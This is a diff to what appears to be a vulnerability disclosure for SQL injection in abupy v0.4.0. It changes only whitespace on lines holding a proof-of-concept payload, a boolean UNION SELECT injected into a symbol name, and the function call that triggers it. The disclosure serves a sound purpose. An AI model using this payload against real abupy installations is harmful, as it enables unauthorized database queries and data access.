@@ -8,9 +8,9 @@ SQL Injection in abupy v0.4.0 causes arbitrary SQL code execution
 
 ## [](#header-3)PROVE: 
 
-Payload: ```"us10101' union select case when {code you wanna execute} then 'usJASNW' else 'usTROVW' end where ''='"```
-Test_payload: ```"us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"```
-Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='")```
+Payload: ```"us10101' union select case when {code you wanna execute} then 'usJASNW' else 'usTROVW' end where ''='"```  
+Test_payload: ```"us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"```  
+Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='")```  
 
 Firstly download abupy latest version(v0.4.0)
 ```
